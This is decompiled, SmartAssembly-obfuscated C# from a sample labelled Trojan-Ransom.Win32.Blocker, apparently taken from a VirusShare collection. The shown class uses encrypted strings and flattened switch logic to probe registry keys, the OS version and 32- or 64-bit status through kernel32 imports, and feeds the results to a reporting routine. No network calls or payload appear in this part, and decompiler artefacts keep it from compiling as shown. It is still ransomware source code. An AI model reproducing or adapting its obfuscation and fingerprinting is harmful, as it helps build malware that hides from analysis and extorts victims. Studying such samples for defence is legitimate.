// Decompiled with JetBrains decompiler
// Type: Ⴈ.ႳႳ
// Assembly: o4tdggb3, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FA0844EB-EF82-404C-B76C-C092ABDB9392
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.bzqq-b74e3dc76fae79b75c26f27ecb85aae1eae4082a42bfa080f7805f32dedc9d67.exe

using Microsoft.Win32;
using My;
using SmartAssembly.Shared;
using SmartAssembly.SmartExceptionsCore;
using SmartAssembly.SmartExceptionsCore.UI;
using SmartAssembly.SmartExceptionsWithUI;
using SmartAssembly.SmartUsageCore;
using SmartAssembly.Zip;
using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Xml;

namespace Ⴈ
{
  internal static class ႳႳ
  {
    public static void Ⴅ()
    {
      int num1;
      int num2;
      int num3;
      int num4;
      int num5;
      try
      {
        try
        {
          try
          {
            num1 = 7;
            while (true)
            {
              switch (num1)
              {
                case 0:
                  num3 = ႷႨ.Ⴍ(WaitSendingReportControl.ႥႥ(ReportSender1.Ⴀ(804, 777), 784, 790), 494, 477);
                  num1 = 14;
                  continue;
                case 1:
                  int num6;
                  switch (num2)
                  {
                    case 5:
                      num6 = 0;
                      break;
                    case 6:
                      num6 = 18;
                      break;
                    default:
                      num6 = 17;
                      break;
                  }
                  num1 = num6;
                  continue;
                case 2:
                case 28:
                  ႳႳ.Ⴍ(Ⴈ.Ⴀ.Ⴐ(1468304850, 6));
                  goto case 5;
                case 3:
                  num1 = !ႳႳ.Ⴃ(Ⴈ.Ⴀ.Ⴐ(1468303949, 5)) ? 23 : 8;
                  continue;
                case 4:
                  ႳႳ.Ⴍ(Ⴈ.Ⴀ.Ⴐ(1468304868, 5));
                  num1 = 5;
                  continue;
                case 5:
                  num2 = UsageCounts.Ⴈ(WaitSendingReportControl.ႥႥ(ReportSender1.Ⴀ(924, 945), 278, 272), 491, 494);
                  num1 = 1;
                  continue;
                case 6:
                  num1 = 9;
                  continue;
                case 8:
                  ႳႳ.Ⴍ(Ⴈ.Ⴀ.Ⴐ(1468303953, 2));
                  num1 = 5;
                  continue;
                case 9:
                  goto label_41;
                case 10:
                  ႳႳ.Ⴍ(Ⴈ.Ⴀ.Ⴐ(1468304829, 0));
                  num1 = 5;
                  continue;
                case 11:
                  goto label_44;
                case 12:
                  num1 = 9;
                  continue;
                case 13:
                  ႳႳ.Ⴍ(MyComputer.Ⴗ(834543396, 3));
                  num1 = 9;
                  continue;
                case 14:
                  int num7;
                  switch (num3)
                  {
                    case 0:
                      num7 = 13;
                      break;
                    case 1:
                      num7 = 25;
                      break;
                    case 2:
                      num7 = 24;
                      break;
                    default:
                      num7 = 12;
                      break;
                  }
                  num1 = num7;
                  continue;
                case 15:
                  num1 = !ႳႳ.Ⴃ(Ⴈ.Ⴀ.Ⴐ(1468304832, 0)) ? 5 : 2;
                  continue;
                case 16:
                  int num8;
                  switch (num4)
                  {
                    case 0:
                      num8 = 22;
                      break;
                    case 1:
                      num8 = 29;
                      break;
                    case 2:
                      num8 = 27;
                      break;
                    default:
                      num8 = 6;
                      break;
                  }
                  num1 = num8;
                  continue;
                case 17:
                  num1 = 9;
                  continue;
                case 18:
                  num4 = ႷႨ.Ⴍ(WaitSendingReportControl.ႥႥ(ReportSender1.Ⴀ(668, 689), 265, 271), 840, 891);
                  num1 = 16;
                  continue;
                case 20:
                  ႳႳ.Ⴍ(Ⴈ.Ⴀ.Ⴐ(1468303979, 2));
                  num1 = 5;
                  continue;
                case 21:
                  num1 = !ႳႳ.Ⴃ(Ⴈ.Ⴀ.Ⴐ(1468304799, 3)) ? 15 : 4;
                  continue;
                case 22:
                  ႳႳ.Ⴍ(MyComputer.Ⴗ(834543608, 4));
                  num1 = 9;
                  continue;
                case 23:
                  num1 = !ႳႳ.Ⴃ(Ⴈ.Ⴀ.Ⴐ(1468304818, 0)) ? 21 : 10;
                  continue;
                case 24:
                  ႳႳ.Ⴍ(MyComputer.Ⴗ(834543381, 2));
                  num1 = 9;
                  continue;
                case 25:
                  ႳႳ.Ⴍ(MyComputer.Ⴗ(834543368, 4));
                  num1 = 9;
                  continue;
                case 27:
                  goto label_40;
                case 29:
                  ႳႳ.Ⴍ(MyComputer.Ⴗ(834543580, 3));
                  num1 = 9;
                  continue;
                default:
                  num1 = !ႳႳ.Ⴃ(Ⴈ.Ⴀ.Ⴐ(1468303982, 2)) ? 3 : 20;
                  continue;
              }
            }
label_40:
            ႳႳ.Ⴍ(MyComputer.Ⴗ(834543547, 2));
label_41:
            ႳႳ.Ⴍ();
            ႳႳ.Ⴄ();
            ႳႳ.Ⴃ();
          }
          catch
          {
          }
label_44:
          num5 = 4;
          switch (num5)
          {
          }
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) num3;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) num4;
          StackFrameHelper.CreateException3(ex, (object) o1, (object) o2, (object) o3);
          throw;
        }
        switch (0)
        {
        }
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o2 = (ValueType) num3;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) num4;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) num1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) num5;
        int num9;
        // ISSUE: variable of a boxed type
        __Boxed<int> o6 = (ValueType) num9;
        StackFrameHelper.CreateException6(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6);
        throw;
      }
    }

    public static void Ⴍ()
    {
      try
      {
        try
        {
          try
          {
            ႳႳ.Ⴍ(MyApplication.Ⴓ((object) ႷႭ.ႥႳ(1491050091, 2), (object) Ⴈ.Ⴀ.ႭႰ(186, 200), 587, 600));
          }
          catch
          {
          }
        }
        catch (Exception ex)
        {
          StackFrameHelper.CreateException0(ex);
          throw;
        }
      }
      catch (Exception ex)
      {
        StackFrameHelper.CreateException0(ex);
        throw;
      }
    }

    public static void Ⴄ()
    {
      try
      {
        try
        {
          try
          {
            ႳႳ.Ⴍ(ႷႭ.ႰႨ(ႳႷ.Ⴗ(2059791202, 2), AppPathFinder.Ⴅ(UnhandledExceptionHandlerWithUI.Ⴍ(633, 572), 23, 85), 524, 574));
          }
          catch
          {
          }
        }
        catch (Exception ex)
        {
          StackFrameHelper.CreateException0(ex);
          throw;
        }
      }
      catch (Exception ex)
      {
        StackFrameHelper.CreateException0(ex);
        throw;
      }
    }

    public static void Ⴃ()
    {
      try
      {
        try
        {
          try
          {
            ႳႳ.Ⴍ(MyApplication.Ⴓ((object) SimpleZip.Ⴓ(661403275, 6), (object) (ႳႳ.Ⴗ() ? 64 : 32), 461, 478));
          }
          catch
          {
          }
        }
        catch (Exception ex)
        {
          StackFrameHelper.CreateException0(ex);
          throw;
        }
      }
      catch (Exception ex)
      {
        StackFrameHelper.CreateException0(ex);
        throw;
      }
    }

    private static bool Ⴗ()
    {
      int num;
      bool Ⴅ;
      try
      {
        bool flag;
        try
        {
          num = 4;
          while (true)
          {
            switch (num)
            {
              case 0:
                num = !ႳႳ.Ⴗ(ႷႭ.ႥႭ(490614446, 0), SimpleZip.Ⴓ(661403364, 1)) ? 7 : 3;
                continue;
              case 1:
                goto label_9;
              case 2:
                goto label_3;
              case 3:
              case 8:
                num = !ႳႳ.Ⴐ(ႳႳ.Ⴓ(), out Ⴅ) ? 7 : 6;
                continue;
              case 5:
              case 6:
                goto label_6;
              case 7:
                goto label_7;
              default:
                num = AppPathFinder.Ⴈ(925, 950) != 8 ? 0 : 2;
                continue;
            }
          }
label_3:
          flag = true;
          goto label_9;
label_6:
          flag = Ⴅ;
          goto label_9;
label_7:
          flag = false;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<bool> o1 = (ValueType) Ⴅ;
          StackFrameHelper.CreateException1(ex, (object) o1);
          throw;
        }
label_9:
        return flag;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<bool> o1 = (ValueType) Ⴅ;
        bool flag;
        // ISSUE: variable of a boxed type
        __Boxed<bool> o2 = (ValueType) flag;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) num;
        StackFrameHelper.CreateException3(ex, (object) o1, (object) o2, (object) o3);
        throw;
      }
    }

    private static bool Ⴗ(string Ⴐ, string Ⴍ)
    {
      int num;
      IntPtr Ⴓ;
      try
      {
        bool flag;
        try
        {
          num = 0;
          while (true)
          {
            switch (num)
            {
              case 1:
                goto label_5;
              case 3:
                goto label_4;
              case 4:
                num = !DoNotPruneTypeAttribute.Ⴓ(Ⴓ, IntPtr.Zero, 744, 659) ? 1 : 3;
                continue;
              case 5:
                goto label_7;
              default:
                Ⴓ = ႳႳ.Ⴈ(Ⴐ);
                goto case 4;
            }
          }
label_4:
          flag = false;
          goto label_7;
label_5:
          flag = AppPathFinder.Ⴄ(ႳႳ.Ⴍ(Ⴓ, Ⴍ), IntPtr.Zero, 929, 1000);
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<IntPtr> o1 = (ValueType) Ⴓ;
          string o2 = Ⴐ;
          string o3 = Ⴍ;
          StackFrameHelper.CreateException3(ex, (object) o1, (object) o2, (object) o3);
          throw;
        }
label_7:
        return flag;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<IntPtr> o1 = (ValueType) Ⴓ;
        bool flag;
        // ISSUE: variable of a boxed type
        __Boxed<bool> o2 = (ValueType) flag;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) num;
        string o4 = Ⴐ;
        string o5 = Ⴍ;
        StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5);
        throw;
      }
    }

    [DllImport("kernel32.dll", EntryPoint = "GetCurrentProcess")]
    private static extern IntPtr Ⴓ();

    [DllImport("kernel32.dll", EntryPoint = "GetModuleHandle", CharSet = CharSet.Auto)]
    private static extern IntPtr Ⴈ(string Ⴈ);

    [DllImport("kernel32", EntryPoint = "GetProcAddress", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr Ⴍ(IntPtr Ⴓ, [MarshalAs(UnmanagedType.LPStr)] string Ⴃ);

    [DllImport("kernel32.dll", EntryPoint = "IsWow64Process", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool Ⴐ(IntPtr Ⴗ, out bool Ⴅ);

    private static bool Ⴃ(string Ⴗ)
    {
      int num1;
      RegistryKey registryKey;
      int num2;
      bool flag1;
      int num3;
      int num4;
      bool flag2;
      try
      {
        try
        {
          num1 = 1;
          switch (num1)
          {
            default:
              registryKey = (RegistryKey) null;
              try
              {
                num2 = 1;
                while (true)
                {
                  switch (num2)
                  {
                    case 2:
                    case 3:
                      goto label_7;
                    case 4:
                      registryKey = SmartAssembly.SmartExceptionsCore.DoNotObfuscateAttribute.Ⴍ(Registry.LocalMachine, ႷႭ.ႰႨ(Ⴈ.Ⴀ.Ⴐ(1468304693, 2), Ⴗ, 477, 495), 256, 365);
                      num2 = 2;
                      continue;
                    case 5:
                      num2 = registryKey != null ? 2 : 4;
                      continue;
                    default:
                      registryKey = SmartAssembly.SmartExceptionsCore.DoNotObfuscateAttribute.Ⴍ(Registry.LocalMachine, ႷႭ.ႰႨ(MyComputer.Ⴗ(834543492, 7), Ⴗ, 773, 823), 644, 745);
                      num2 = 5;
                      continue;
                  }
                }
label_7:
                flag1 = registryKey != null;
              }
              finally
              {
                num3 = 1;
                while (true)
                {
                  switch (num3)
                  {
                    case 0:
                    case 5:
                      goto label_12;
                    case 6:
                      goto label_11;
                    default:
                      num3 = registryKey == null ? 5 : 6;
                      continue;
                  }
                }
label_11:
                SmartAssembly.SmartUsageCore.DoNotObfuscateAttribute.Ⴍ(registryKey, 1023, 931);
label_12:;
              }
              num4 = 1;
              switch (num4)
              {
                case 2:
                  break;
                default:
                  flag2 = flag1;
                  break;
              }
              break;
          }
        }
        catch (Exception ex)
        {
          RegistryKey o1 = registryKey;
          // ISSUE: variable of a boxed type
          __Boxed<bool> o2 = (ValueType) flag1;
          string o3 = Ⴗ;
          StackFrameHelper.CreateException3(ex, (object) o1, (object) o2, (object) o3);
          throw;
        }
        switch (1)
        {
          default:
            return flag2;
        }
      }
      catch (Exception ex)
      {
        RegistryKey o1 = registryKey;
        // ISSUE: variable of a boxed type
        __Boxed<bool> o2 = (ValueType) flag1;
        // ISSUE: variable of a boxed type
        __Boxed<bool> o3 = (ValueType) flag2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) num1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) num2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o6 = (ValueType) num3;
        // ISSUE: variable of a boxed type
        __Boxed<int> o7 = (ValueType) num4;
        int num5;
        // ISSUE: variable of a boxed type
        __Boxed<int> o8 = (ValueType) num5;
        string o9 = Ⴗ;
        StackFrameHelper.CreateException9(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6, (object) o7, (object) o8, (object) o9);
        throw;
      }
    }

    public static void Ⴍ([ႳႠ] string Ⴐ)
    {
      try
      {
        ႳႨ.Ⴈ(Ⴐ);
      }
      catch (Exception ex)
      {
        string o1 = Ⴐ;
        StackFrameHelper.CreateException1(ex, (object) o1);
        throw;
      }
    }

    static ႳႳ()
    {
      try
      {
        SmartAssembly.SmartUsageCore.DoNotPruneAttribute.ႰႣ();
      }
      catch (Exception ex)
      {
        StackFrameHelper.CreateException0(ex);
        throw;
      }
    }

    internal static string Ⴀ([In] Exception obj0, [In] int obj1, [In] int obj2)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj2 ^ obj1)
        {
          case 98:
            num2 = 4;
            break;
          default:
            num2 = 5;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 1:
            case 4:
            case 7:
              goto label_8;
            case 2:
              num1 = 3;
              continue;
            case 3:
              goto label_3;
            case 5:
              num1 = 3;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (ႳႳ.Ⴀ);
              num1 = 3;
              continue;
          }
        }
label_8:
        return obj0.StackTrace;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        Exception o2 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
        throw;
      }
    }

    internal static string Ⴜ([In] Assembly obj0, [In] int obj1, [In] int obj2)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj2 ^ obj1)
        {
          case 50:
            num2 = 5;
            break;
          default:
            num2 = 3;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 5:
            case 6:
              goto label_8;
            case 2:
              num1 = 4;
              continue;
            case 3:
              num1 = 4;
              continue;
            case 4:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (ႳႳ.Ⴜ);
              num1 = 4;
              continue;
          }
        }
label_8:
        return obj0.FullName;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        Assembly o2 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
        throw;
      }
    }

    internal static void ႥႣ([In] XmlWriter obj0, [In] string obj1, [In] string obj2, [In] int obj3, [In] int obj4)
    {
      int num1;
      try
      {
        num1 = 3;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 1:
              num1 = 3;
              continue;
            case 2:
              goto label_8;
            case 4:
            case 5:
              goto label_7;
            default:
              int num2;
              switch (obj4 ^ obj3)
              {
                case 109:
                  num2 = 5;
                  break;
                default:
                  num2 = 1;
                  break;
              }
              num1 = num2;
              continue;
          }
        }
label_8:
        return;
label_7:
        obj0.WriteElementString(obj1, obj2);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        int num3;
        // ISSUE: variable of a boxed type
        __Boxed<int> o2 = (ValueType) num3;
        XmlWriter o3 = obj0;
        string o4 = obj1;
        string o5 = obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o6 = (ValueType) obj3;
        // ISSUE: variable of a boxed type
        __Boxed<int> o7 = (ValueType) obj4;
        StackFrameHelper.CreateException7(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6, (object) o7);
        throw;
      }
    }

    internal static FileStream ႥႥ([In] string obj0, [In] int obj1, [In] int obj2)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj2 ^ obj1)
        {
          case 73:
            num2 = 2;
            break;
          default:
            num2 = 4;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 1:
              num1 = 7;
              continue;
            case 2:
              goto label_8;
            case 3:
            case 5:
            case 6:
            case 7:
              goto label_3;
            case 4:
              num1 = 7;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (ႳႳ.ႥႥ);
              num1 = 7;
              continue;
          }
        }
label_8:
        return File.OpenWrite(obj0);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        string o2 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
        throw;
      }
    }

    internal static byte[] ႥႭ([In] MemoryStream obj0, [In] int obj1, [In] int obj2)
    {
label_0:
      try
      {
        switch ((obj2 ^ obj1) - 5)
        {
          case 0:
            return obj0.ToArray();
          default:
            goto label_0;
        }
      }
      catch (Exception ex)
      {
        MemoryStream o1 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o2 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj2;
        StackFrameHelper.CreateException3(ex, (object) o1, (object) o2, (object) o3);
        throw;
      }
    }
  }
}
